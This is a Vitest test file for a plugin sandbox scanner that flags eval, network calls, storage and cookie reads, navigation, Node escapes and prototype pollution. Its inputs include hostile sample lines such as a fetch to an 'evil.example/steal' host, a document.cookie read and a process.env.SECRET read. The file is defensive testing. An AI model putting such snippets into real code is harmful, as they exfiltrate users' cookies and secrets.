import { describe, expect, it } from 'vitest';
import {
  assertPluginSourceSafe,
  scanPluginSource,
  stripStringsAndComments,
  type SandboxViolationKind,
} from './sandboxGuard';

/** A representative well-behaved external plugin bundle. */
const SAFE_BUNDLE = `
(function () {
  window.__WE_PLUGIN_API__.registerPlugin('demo', function (ctx) {
    ctx.registerMenuItem({
      id: 'demo:hello',
      pluginId: 'demo',
      label: 'Say hello',
      onClick: function () {
        var project = ctx.getProject();
        ctx.updateProject(function (p) {
          return Object.assign({}, p, { name: p.name + '!' });
        });
      },
    });
    return function cleanup() {};
  });
})();
`;

function kinds(source: string): SandboxViolationKind[] {
  return scanPluginSource(source).map((v) => v.kind);
}

describe('scanPluginSource', () => {
  it('returns no violations for a well-behaved bundle', () => {
    expect(scanPluginSource(SAFE_BUNDLE)).toEqual([]);
  });

  it('flags dynamic code evaluation', () => {
    expect(kinds('var x = eval("1+1");')).toContain('dynamic-eval');
    expect(kinds('var f = new Function("return 1");')).toContain('dynamic-eval');
    expect(kinds('setTimeout("doEvil()", 0);')).toContain('dynamic-eval');
    expect(kinds('setInterval("tick()", 100);')).toContain('dynamic-eval');
  });

  it('does not flag function-argument timers', () => {
    expect(kinds('setTimeout(function () { run(); }, 0);')).not.toContain('dynamic-eval');
    expect(kinds('setTimeout(() => run(), 0);')).not.toContain('dynamic-eval');
  });

  it('flags raw network access', () => {
    expect(kinds('fetch("https://evil.example/steal");')).toContain('network');
    expect(kinds('var r = new XMLHttpRequest();')).toContain('network');
    expect(kinds('var ws = new WebSocket("wss://evil");')).toContain('network');
    expect(kinds('navigator.sendBeacon("/leak", data);')).toContain('network');
  });

  it('flags persistent storage and cookie access', () => {
    expect(kinds('localStorage.setItem("k", "v");')).toContain('storage');
    expect(kinds('sessionStorage.getItem("k");')).toContain('storage');
    expect(kinds('indexedDB.open("db");')).toContain('storage');
    expect(kinds('var c = document.cookie;')).toContain('storage');
  });

  it('flags navigation attempts', () => {
    expect(kinds('window.location.href = "https://evil";')).toContain('navigation');
    expect(kinds('location.replace("https://evil");')).toContain('navigation');
    expect(kinds('top.location = "x";')).toContain('navigation');
  });

  it('flags DOM-escape sinks', () => {
    expect(kinds('document.write("<script>");')).toContain('dom-escape');
    expect(kinds('el.innerHTML = userInput;')).toContain('dom-escape');
    expect(kinds('importScripts("https://evil/x.js");')).toContain('dom-escape');
  });

  it('flags node-runtime escapes', () => {
    expect(kinds('var fs = require("fs");')).toContain('node-runtime');
    expect(kinds('var p = process.env.SECRET;')).toContain('node-runtime');
    expect(kinds('console.log(__dirname);')).toContain('node-runtime');
  });

  it('flags prototype pollution', () => {
    expect(kinds('obj.__proto__.polluted = true;')).toContain('prototype-pollution');
    expect(kinds('({}).constructor.prototype.x = 1;')).toContain('prototype-pollution');
  });

  it('flags obfuscated realm-escape bracket access on globals', () => {
    expect(kinds('window["ev" + "al"]("1");')).toContain('realm-escape');
    expect(kinds('globalThis["fetch"]("/x");')).toContain('realm-escape');
  });

  it('does not flag forbidden tokens that appear only in strings or comments', () => {
    const benign = `
      // this plugin does not call eval or fetch
      var note = "do not use localStorage here";
      var help = 'the require pattern is forbidden';
      /* document.cookie is sensitive */
      ctx.registerMenuItem({ id: 'demo:x', pluginId: 'demo', label: 'eval demo' });
    `;
    expect(scanPluginSource(benign)).toEqual([]);
  });

  it('still detects forbidden calls hidden in template interpolations', () => {
    const sneaky = 'var s = `value=${eval("1")}`;';
    expect(kinds(sneaky)).toContain('dynamic-eval');
  });

  it('deduplicates repeated identical violations', () => {
    const repeated = 'fetch("/a"); fetch("/b"); fetch("/c");';
    const networkViolations = scanPluginSource(repeated).filter((v) => v.kind === 'network');
    expect(networkViolations).toHaveLength(1);
  });
});

describe('assertPluginSourceSafe', () => {
  it('does not throw for a safe bundle', () => {
    expect(() => assertPluginSourceSafe('demo', SAFE_BUNDLE)).not.toThrow();
  });

  it('throws and lists every violation for an unsafe bundle', () => {
    const unsafe = 'eval("x"); fetch("/y"); localStorage.clear();';
    expect(() => assertPluginSourceSafe('bad-plugin', unsafe)).toThrow(/bad-plugin/);
    expect(() => assertPluginSourceSafe('bad-plugin', unsafe)).toThrow(/forbidden capabilities/);
  });

  it('uses singular wording for a single violation', () => {
    expect(() => assertPluginSourceSafe('bad', 'eval("x");')).toThrow(/forbidden capability:/);
  });
});

describe('stripStringsAndComments', () => {
  it('removes line comments', () => {
    expect(stripStringsAndComments('a // eval(\nb')).not.toContain('eval');
  });

  it('removes block comments', () => {
    expect(stripStringsAndComments('a /* fetch( */ b')).not.toContain('fetch');
  });

  it('removes string literals', () => {
    expect(stripStringsAndComments('var x = "require(";')).not.toContain('require');
  });

  it('preserves template interpolation code', () => {
    expect(stripStringsAndComments('`a${eval(1)}b`')).toContain('eval');
  });
});
